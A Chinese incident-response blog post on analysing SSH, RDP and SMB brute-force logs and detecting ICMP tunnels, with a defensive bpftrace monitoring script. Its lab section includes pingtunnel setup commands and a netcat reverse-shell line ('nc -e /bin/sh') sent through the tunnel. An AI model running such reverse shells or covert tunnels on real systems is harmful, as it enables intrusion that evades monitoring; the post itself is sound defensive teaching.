@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+<link rel="stylesheet" href="/css/custom.css"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>5.密码爆破日志分析与隧道流量检查</title><meta charset="utf-8"><meta name="description" content="Ladder@**免责声明** :本文所述过程仅用于安全研究与教育目的，旨在提升对软件安全风险的认知与防御能力。所有操作均应在合法授权的隔离实验环境中进行,严禁用于任何未授权的系统渗透、攻击或非法活动。作者及发布方不对因误用、滥用本文内容而导致的任何直接或间接损失承担责任。用户须自行承担使用风险，并严格遵守《中华人民共和国网络安全法》及相关法律法规。 爆破日志分析 在应急"><meta name="author" content="hzhsec">
+<link rel="canonical" href="https://hzhsec.github.io/list/halo_to_publish/5.mi-ma-bao-po-ri-zhi-fen-xi-yu-sui-dao-liu-liang-jian-cha/"><meta property="og:title" content="5.密码爆破日志分析与隧道流量检查" /><meta property="og:description" content="**免责声明** :本文所述过程仅用于安全研究与教育目的，旨在提升对软件安全风险的认知与防御能力。所有操作均应在合法授权的隔离实验环境中进行,严禁用于任何未授权的系统渗透、攻击或非法活动。作者及发布方不对因误用、滥用本文内容而导致的任何直接或间接损失承担责任。用户须自行承担使用风险，并严格遵守《中华人民共和国网络安全法》及相关法律法规。 爆破日志分析 在应急" />
+<meta property="og:type" content="article" /><meta property="og:url" content="https://hzhsec.github.io/list/halo_to_publish/5.mi-ma-bao-po-ri-zhi-fen-xi-yu-sui-dao-liu-liang-jian-cha/" />
+<meta property="article:section" content="list" /><meta property="article:published_time" content="2026-04-04T10:00:00+08:00" /><meta property="article:modified_time" content="2026-04-04T10:00:00+08:00" /><meta name="twitter:card" content="summary"/><meta name="twitter:title" content="5.密码爆破日志分析与隧道流量检查"/><meta name="twitter:description" content="**免责声明** :本文所述过程仅用于安全研究与教育目的，旨在提升对软件安全风险的认知与防御能力。所有操作均应在合法授权的隔离实验环境中进行,严禁用于任何未授权的系统渗透、攻击或非法活动。作者及发布方不对因误用、滥用本文内容而导致的任何直接或间接损失承担责任。用户须自行承担使用风险，并严格遵守《中华人民共和国网络安全法》及相关法律法规。 爆破日志分析 在应急"/>
+<link rel="icon" href="/static/hzhsec.png" sizes="16x16"><link rel="apple-touch-icon" href="/static/hzhsec.png"><link rel="manifest" href="/static/hzhsec.png">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-webfont@1.7.0/style.css" />
+<link rel="stylesheet" href="/css/main.min.ec28f09e946fc0df77c187fcd0d0ebde58fca6de8efb8e1620f3d45c32d4da88.css" crossorigin="anonymous" media="screen" />
+<link rel="stylesheet" href="/scss/highlight/github-dark.min.min.66034289ee9a113219a2c4aae0a8bd2095ab255c832a42efcf5863f10814e7a1.css" />
+<script src="/js/highlight.min.min.c098d85b5396dec4707ea2cead1445b4dc2ff0fc56b8dbbd9049d0d1c50ad237.js"></script><script>hljs.highlightAll();</script>
+<script>(()=>{var t=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,e=localStorage.getItem("theme");t&&e===null&&(localStorage.setItem("theme","dark"),document.documentElement.setAttribute("data-dark-mode","")),t&&e==="dark"&&document.documentElement.setAttribute("data-dark-mode",""),e==="dark"&&document.documentElement.setAttribute("data-dark-mode","")})()</script></head>
+<body><main class="wrapper"><nav class="navigation"><section class="container"><a class="navigation-brand" href="/">主页</a><input type="checkbox" id="menu-toggle" />
+<label class="menu-button float-right" for="menu-toggle"><span></span><span></span><span></span></label><ul class="navigation-list" id="navigation-list">
+<li class="navigation-item navigation-menu"><a class="navigation-link" href="/list/">目录</a></li><li class="navigation-item navigation-menu"><a class="navigation-link" href="/archives/">归档</a></li>
+<li class="navigation-item navigation-menu"><a class="navigation-link" href="/message/">关于</a></li><li class="navigation-item navigation-menu"><a class="navigation-link" href="/categories/">分类</a></li>
+<li class="navigation-item navigation-menu"><a class="navigation-link" href="https://umami-evtq.vercel.app/share/NdRAzdY1AwLB5KF2/hzhsec.github.io">网站统计</a></li><li class="navigation-item menu-separator"><span>|</span></li>
+<li class="navigation-item navigation-social"><a class="navigation-link" href="https://github.com/hzhsec">GitHub</a></li><li class="navigation-item navigation-social"><a class="navigation-link" href="/message/">Mail</a></li></ul></section></nav>
+<div id="content"><article class="blog-single"><header class="blog-title"><h1>5.密码爆破日志分析与隧道流量检查</h1></header><p><small>April 4, 2026&nbsp;· 2236 words&nbsp;· 12 min</small><p><details class="blog-toc" open><summary>Contents</summary><nav id="TableOfContents"><ul><li class="toc-item toc-depth-1"><details class="toc-branch toc-depth-1"><summary><a class="toc-link" href="#爆破日志分析">爆破日志分析</a></summary><div class="toc-children"><ul><li class="toc-item toc-depth-2"><details class="toc-branch toc-depth-2"><summary><a class="toc-link" href="#linux">Linux</a></summary><div class="toc-children"><ul><li class="toc-item toc-depth-3"><a class="toc-link" href="#linux-ssh爆破">Linux-ssh爆破</a></li></ul></div></details></li><li class="toc-item toc-depth-2"><details class="toc-branch toc-depth-2"><summary><a class="toc-link" href="#windows">Windows</a></summary><div class="toc-children"><ul><li class="toc-item toc-depth-3"><a class="toc-link" href="#windows-rdp">Windows-RDP：</a></li><li class="toc-item toc-depth-3"><a class="toc-link" href="#windows-smb">Windows-SMB：</a></li></ul></div></details></li></ul></div></details></li><li class="toc-item toc-depth-1"><details class="toc-branch toc-depth-1"><summary><a class="toc-link" href="#隧道流量分析">隧道流量分析</a></summary><div class="toc-children"><ul><li class="toc-item toc-depth-2"><details class="toc-branch toc-depth-2"><summary><a class="toc-link" href="#icmp实验">ICMP实验</a></summary><div class="toc-children"><ul><li class="toc-item toc-depth-3"><a class="toc-link" href="#linux-icmp">Linux-ICMP</a></li><li class="toc-item toc-depth-3"><a class="toc-link" href="#windows-icmp">Windows-ICMP</a></li></ul></div></details></li></ul></div></details></li></ul></nav></details><section class="blog-content"><blockquote><p><strong>免责声明</strong>  :本文所述过程仅用于安全研究与教育目的，旨在提升对软件安全风险的认知与防御能力。所有操作均应在合法授权的隔离实验环境中进行,严禁用于任何未授权的系统渗透、攻击或非法活动。作者及发布方不对因误用、滥用本文内容而导致的任何直接或间接损失承担责任。用户须自行承担使用风险，并严格遵守《中华人民共和国网络安全法》及相关法律法规。</p></blockquote>
+<h1 id="爆破日志分析">爆破日志分析</h1>
+<p>在应急响应时,为了了解和追查攻击者的攻击入口点和攻击意图,通常使用日志分析的方法,还原攻击方法获取攻击者指纹 其中爆破攻击是在内外网中最常见的一种攻击,尤其是内网横向移动</p>
+<p>在分析日志时,需要做到:</p>
+<ul><li>明确日志的具体路径</li><li>明确日志中有哪些属性和判断依据</li></ul>
+<p>现在我通过Linux和Windows两种操作系统为例,分析爆破攻击的日志</p>
+<h2 id="linux">Linux</h2>
+<p>系统日志通常是分析 <code>/var/log</code> 路径下面的日志</p>
+<div class="highlight"><pre tabindex="0"><code class="language-text" data-lang="text">其中最为重要的是:
+/var/log/auth.log
+或者
+/var/log/secure</code></pre></div>
+<p>当然如果是第三方安装的程序,需要找对应的日志路径</p>
+<h3 id="linux-ssh爆破">Linux-ssh爆破</h3>
+<h4 id="攻击复现">攻击复现</h4>
+<p>使用<code>railgun</code>破解工具对虚拟机进行<code>ssh</code>爆破 <img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/20260404141900046.png" alt="image.png"></p>
+<h4 id="日志检查">日志检查</h4>
+<p>查看 <code>/var/log/secure</code> 情况 <img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/20260404142007923.png" alt="image.png"> 查看错误日志登录 <code>cat /var/log/secure|grep Failed</code> <img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/20260404142205896.png" alt="image.png"> 其中许多错误密码记录,并且时间间隔很近,可以判定为爆破事件</p>
+<h4 id="成功判断">成功判断</h4>
+<p>观察是否登录成功: <code>cat /var/log/secure|grep Accepted</code> <img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/20260404142445140.png" alt="image.png"></p>
+<h4 id="来源统计">来源统计</h4>
+<p>统计登录失败的ip和次数 <img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/20260404143329271.png" alt="image.png"></p>
+<h4 id="处置建议">处置建议</h4>
+<p>有爆破成功登录的日志,后续需要紧急对该ip进行拉黑封堵 防止爆破建议安装 <code>fail2ban</code> 进行防御</p>
+<h2 id="windows">Windows</h2>
+<h3 id="windows-rdp">Windows-RDP：</h3>
+<p>事件ID：4625/4624</p>
+<ul><li>4624:登陆成功</li><li>4625:登陆失败</li></ul>
+<p>登陆类型：2/3/5/10</p>
+<ul><li>2 交互式登录（也称为“本地登录”）</li><li>3 <code>Network</code> (网络)</li><li>10 远程桌面（以前称为“终端服务”）</li></ul>
+<h4 id="环境准备">环境准备</h4>
+<p>虚拟机启动远程服务端口 控制面板--&gt;搜索远程--&gt;允许远程访问你的计算机--&gt;允许应用,此时3389端口就启用了 <img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/20260404144454192.png" alt="image.png"> 关闭防火墙 <img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/20260404144640267.png" alt="image.png"></p>
+<h4 id="审核配置">审核配置</h4>
+<p>开启审核登录成功失败策略</p>
+<div class="highlight"><pre tabindex="0"><code class="language-text" data-lang="text">Win + R → secpol.msc</code></pre></div>
+<p>点击</p>
+<div class="highlight"><pre tabindex="0"><code class="language-text" data-lang="text">本地策略
+ └── 审核策略
+      └── 审核登录事件</code></pre></div>
+<p>修改(当然最好全部打开,为后面的实验准备) <img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/20260404154720318.png" alt="image.png"></p>
+<h4 id="日志位置">日志位置</h4>
+<p>日志查看路径 日志查看方法有多种:</p>
+<ol><li>直接访问</li></ol>
+<p>文件夹<code>C:\Windows\System32\winevt\Logs</code>下的日志,一般重点看<code>security.evtx</code>、<code>setup.evtx</code>、<code>system.evtx</code> <img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/20260404170003909.png" alt="image.png"></p>
+<ol><li>使用事件管理器</li></ol>
+<p>Win+R输入<code>eventvwr</code>--&gt;windows日志--&gt;安全 接下来使用后面使用事件管理器为主 <img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/20260404145251100.png" alt="image.png"></p>
+<h4 id="攻击复现-2">攻击复现</h4>
+<p>同理使用工具爆破 <img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/20260404154843521.png" alt="image.png"></p>
+<h4 id="日志分析">日志分析</h4>
+<p>查看日志,看到大量失败日志,并且事件时间距离很近,判断为爆破事件 <img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/20260404154944111.png" alt="image.png"> 通过筛选和时间判断,登录是否成功 <img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/20260404155302685.png" alt="image.png"> 查看详细信息可以获取爆破的事件类型为网络登录 <img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/20260404155351848.png" alt="image.png"></p>
+<h3 id="windows-smb">Windows-SMB：</h3>
+<p>事件ID：4625/4624 登陆类型：2/3/5/10 事件日志：Windows日志&gt;安全</p>
+<h4 id="环境准备-2">环境准备</h4>
+<p>在本地搭建开启smb服务 参考链接:https://zhuanlan.zhihu.com/p/879444178 策略也要改,不然没有日志</p>
+<h4 id="攻击复现-3">攻击复现</h4>
+<p>使用爆破工具 <img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/20260404163725647.png" alt="image.png"></p>
+<h4 id="日志分析-2">日志分析</h4>
+<p>同样 <img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/20260404165436506.png" alt="image.png"></p>
+<h4 id="信息提取">信息提取</h4>
+<p>从详细信息提取攻击者的信息和事件类型 <img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/20260404165534957.png" alt="image.png"></p>
+<p>除上述例子外还有<code>FTP</code>,<code>Redis</code>,<code>MYSQL</code>,<code>STMP</code>等协议爆破事件,有的是通过系统下载会直接存到系统日志,有些则是应用自带日志管理,需要灵活辨认</p>
+<h1 id="隧道流量分析">隧道流量分析</h1>
+<p>场景说明：内网或不出网的情况下，协议隧道技术很常见，那么如何定位到进程及攻击者？</p>
+<ol><li>明确隧道最常使用的协议技术(<code>socket</code>,<code>DNS</code>,<code>ICMP</code>等等)</li><li>明确Windows,Linux中分析技术</li></ol>
+<p>下面我以ICMP隧道为例子</p>
+<h2 id="icmp实验">ICMP实验</h2>
+<h3 id="linux-icmp">Linux-ICMP</h3>
+<p><code>Kail</code>为客户端:<code>192.168.41.128</code> <img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/20260404191631559.png" alt="image.png"> <code>Centos</code>为服务端:<code>192.168.41.144</code> <img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/20260404191604849.png" alt="image.png"></p>
+<h4 id="工具准备">工具准备</h4>
+<p>工具地址：<a href="https://github.com/esrrhs/pingtunnel">pingtunnel</a></p>
+<h4 id="服务端启动">服务端启动</h4>
+<p>服务端启动</p>
+<div class="highlight"><pre tabindex="0"><code class="language-bash" data-lang="bash">sudo ./pingtunnel -type server -key 1234</code></pre></div>
+<p><img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/20260404192517626.png" alt="image.png"></p>
+<h4 id="客户端启动">客户端启动</h4>
+<p>客户端启动</p>
+<div class="highlight"><pre tabindex="0"><code class="language-bash" data-lang="bash">sudo ./pingtunnel -type client -l :4445 -s 192.168.41.144 -t 127.0.0.1:4444 -tcp 1 -key 1234</code></pre></div>
+<p><img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/20260404194722760.png" alt="image.png"></p>
+<h4 id="隧道说明">隧道说明</h4>
+<p>含义</p>
+<div class="highlight"><pre tabindex="0"><code class="language-text" data-lang="text">client连4445 → server → server本机4444</code></pre></div>
+<h4 id="连接测试">连接测试</h4>
+<p>测试连接 服务端监听4444</p>
+<div class="highlight"><pre tabindex="0"><code class="language-bash" data-lang="bash">nc -lvvp 4444</code></pre></div>
+<p><img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/20260404194935333.png" alt="image.png"></p>
+<h4 id="上线验证">上线验证</h4>
+<p>客户端执行上线</p>
+<div class="highlight"><pre tabindex="0"><code class="language-bash" data-lang="bash">nc -e /bin/sh 127.0.0.1 4445</code></pre></div>
+<p><img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/20260404194948300.png" alt="image.png"> 以上看出已经连上了</p>
+<h4 id="本地检查">本地检查</h4>
+<p>看看客户端本地能不能查看到外联情况</p>
+<div class="highlight"><pre tabindex="0"><code class="language-bash" data-lang="bash">netstat -anpt</code></pre></div>
+<p><img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/20260404195159993.png" alt="image.png"> 也是成功将隧道打通隐藏了</p>
+<h4 id="隧道检测">隧道检测</h4>
+<p>分析与发现<code>icmp</code>隧道： https://github.com/Just-Hack-For-Fun/request_monitor <code>request_monitor.sh</code></p>
+<div class="highlight"><pre tabindex="0"><code class="language-bash" data-lang="bash">#!/bin/bash
+
+convert_ip_to_integers() {
+  local ip=$1
+  IFS=&#x27;.&#x27; read -r a b c d &lt;&lt;&lt; &quot;$ip&quot;
+
+  be_ip_int=$((a &lt;&lt; 24 | b &lt;&lt; 16 | c &lt;&lt; 8 | d))
+  le_ip_int=$((d &lt;&lt; 24 | c &lt;&lt; 16 | b &lt;&lt; 8 | a))
+
+  echo &quot;$be_ip_int $le_ip_int&quot;
+}
+
+IP=&quot;$1&quot;
+
+if [ -z &quot;$IP&quot; ]; then
+  echo &quot;用法: $0 &lt;目标IP&gt;&quot;
+  exit 1
+fi
+
+read big_endian little_endian &lt;&lt;&lt; &quot;$(convert_ip_to_integers &quot;$IP&quot;)&quot;
+
+echo &quot;Start listening for ICMP traffic related to $IP&quot;
+echo &quot;&quot;
+
+sudo bpftrace ./request_monitor.bt &quot;$big_endian&quot; &quot;$little_endian&quot; | while IFS= read -r line; do
+  if [[ &quot;$line&quot; == EVENT* ]]; then
+    pid=$(echo &quot;$line&quot; | sed -n &#x27;s/.*pid=\([0-9]\+\).*/\1/p&#x27;)
+
+    exe=&quot;N/A&quot;
+    if [[ -n &quot;$pid&quot; &amp;&amp; -e &quot;/proc/$pid/exe&quot; ]]; then
+      exe=$(readlink -f &quot;/proc/$pid/exe&quot; 2&gt;/dev/null)
+      [[ -z &quot;$exe&quot; ]] &amp;&amp; exe=&quot;N/A&quot;
+    fi
+
+    echo &quot;$line exe=$exe&quot;
+  else
+    echo &quot;$line&quot;
+  fi
+done</code></pre></div>
+<p><code>request_monitor.bt</code></p>
+<div class="highlight"><pre tabindex="0"><code class="language-bash" data-lang="bash">#!/usr/bin/env bpftrace
+
+/*
+  监听和指定 IP 相关的 ICMP 流量（双向）
+  参数:
+    $1 = 目标IP大端整数
+    $2 = 目标IP小端整数
+*/
+
+kprobe:__dev_queue_xmit
+{
+    $skb = (struct sk_buff *)arg0;
+    if ($skb) {
+        $iph = (struct iphdr *)($skb-&gt;head + $skb-&gt;network_header);
+        if ($iph) {
+            if ($iph-&gt;protocol == 1) {
+                if ($iph-&gt;daddr == $1 || $iph-&gt;daddr == $2 ||
+                    $iph-&gt;saddr == $1 || $iph-&gt;saddr == $2) {
+
+                    printf(&quot;EVENT send pid=%d tid=%d comm=%s src=%s dst=%s\n&quot;,
+                           pid, tid, comm,
+                           ntop(2, $iph-&gt;saddr),
+                           ntop(2, $iph-&gt;daddr));
+                }
+            }
+        }
+    }
+}
+
+kprobe:netif_receive_skb
+{
+    $skb = (struct sk_buff *)arg0;
+    if ($skb) {
+        $iph = (struct iphdr *)($skb-&gt;head + $skb-&gt;network_header);
+        if ($iph) {
+            if ($iph-&gt;protocol == 1) {
+                if ($iph-&gt;daddr == $1 || $iph-&gt;daddr == $2 ||
+                    $iph-&gt;saddr == $1 || $iph-&gt;saddr == $2) {
+
+                    printf(&quot;EVENT recv pid=%d tid=%d comm=%s src=%s dst=%s\n&quot;,
+                           pid, tid, comm,
+                           ntop(2, $iph-&gt;saddr),
+                           ntop(2, $iph-&gt;daddr));
+                }
+            }
+        }
+    }
+}</code></pre></div>
+<h4 id="环境安装">环境安装</h4>
+<p>安装：</p>
+<div class="highlight"><pre tabindex="0"><code class="language-bash" data-lang="bash">sudo apt update
+sudo apt install bpftrace
+
+chmod +x request_monitor.sh
+chmod +x request_monitor.bt</code></pre></div>
+<h4 id="启动监听">启动监听</h4>
+<p>启动监听</p>
+<div class="highlight"><pre tabindex="0"><code class="language-bash" data-lang="bash">./request_monitor.sh ip
+ip可以是本机ip也可以是目标ip</code></pre></div>
+<p>客户机ip(受害机) <img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/20260404214434079.png" alt="image.png"> 成功获取到本地<code>icmp</code>连接的端口以及程序进程和路径</p>
+<h4 id="处置建议-2">处置建议</h4>
+<p>后面就是对ip进行处置封锁</p>
+<h3 id="windows-icmp">Windows-ICMP</h3>
+<p>服务端<code>kail</code>:<code>192.168.42.130</code> <img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/20260404220016953.png" alt="image.png"></p>
+<p>客户端<code>win10</code>:<code>192.168.42.133</code> <img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/20260404220036689.png" alt="image.png"></p>
+<h4 id="实验环境">实验环境</h4>
+<p>实验：https://github.com/esrrhs/pingtunnel</p>
+<h4 id="服务端启动-2">服务端启动</h4>
+<div class="highlight"><pre tabindex="0"><code class="language-bash" data-lang="bash">sudo ./pingtunnel -type server -key 1234</code></pre></div>
+<p><img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/20260404220232208.png" alt="image.png"></p>
+<h4 id="客户端启动-2">客户端启动</h4>
+<div class="highlight"><pre tabindex="0"><code class="language-bash" data-lang="bash">pingtunnel.exe -type client -l :4445 -s 192.168.42.130 -t 127.0.0.1:4444 -tcp 1 -key 1234</code></pre></div>
+<p><img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/20260404220223552.png" alt="image.png"></p>
+<h4 id="流量分析">流量分析</h4>
+<p>分析<code>icmp</code>流量：<code>Microsoft Message Analyzer</code> 下载：<a href="https://gitcode.com/open-source-toolkit/bd800"><code>Microsoft Message Analyzer</code></a></p>
+<h4 id="进程定位">进程定位</h4>
+<p>以管理员身份运行 <img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/20260404220745510.png" alt="image.png"> 点击<code>Start Local Trace</code>找到<code>icmp</code>流量 <img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/20260404221113086.png" alt="image.png"> 选中一条,打开<code>details4</code>,如图 <img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/20260404221749964.png" alt="image.png"> 点击详细信息,如图 <img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/20260404221830408.png" alt="image.png"> 就可以准查到进程命令了 <img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/20260404221919414.png" alt="image.png"></p>
+<h4 id="补充说明">补充说明</h4>
+<p>由于<code>Microsoft Message Analyzer</code>现在已经停止更新了,所以有些系统无法使用,也可以通过<code>wireshark</code>对流量进行分析</p>
+<p><strong>处置</strong> 封IP及防火墙限制协议</p></section><div class="paginator"><a class="prev" href="https://hzhsec.github.io/list/halo_to_publish/1.webru-qin-cha-sha-zhi-nan/"><small>← 上一篇</small><span>1.Web入侵查杀指南</span></a><a class="next" href="https://hzhsec.github.io/list/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/1.webru-qin-cha-sha-zhi-nan/"><small>下一篇 →</small><span>1.Web入侵查杀指南</span></a></div></article></div><footer class="footer"><p>&copy; 2026 <a href="https://hzhsec.github.io/">Hzhsec home</a> Powered by <a href="https://gohugo.io/" rel="noopener" target="_blank">Hugo️️</a> <a href="https://github.com/guangzhengli/hugo-theme-ladder" rel="noopener" target="_blank">Ladder</a></p></footer>
+<a href="#top" class="top-link" id="top-link" accesskey="g">Top</a><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){if(document.body.scrollTop>800||document.documentElement.scrollTop>800){mybutton.style.visibility="visible";mybutton.style.opacity="1";}else{mybutton.style.visibility="hidden";mybutton.style.opacity="0";}};</script>
+<script>document.querySelectorAll('pre > code').forEach((codeblock)=>{const copybutton=document.createElement('button');copybutton.classList.add('copy-code');copybutton.innerHTML='Copy';function done(){copybutton.innerHTML='Copied';setTimeout(()=>{copybutton.innerHTML='Copy';},2000);}copybutton.addEventListener('click',()=>{if('clipboard' in navigator){navigator.clipboard.writeText(codeblock.textContent);done();return;}const range=document.createRange();range.selectNodeContents(codeblock);const selection=window.getSelection();selection.removeAllRanges();selection.addRange(range);try{document.execCommand('copy');done();}catch(e){}selection.removeRange(range);});codeblock.parentNode.appendChild(copybutton);});</script></main></body>
+<script src="/main.min.6bb26b69159420159c74dc9e097b06a578ed2b68c701466a91a44a9632d851bd0af167a1b30012387b4c512b48ad9ad4d3394e04d77ae38d57e1920fe4ed34fe.js" crossorigin="anonymous" defer></script></html>
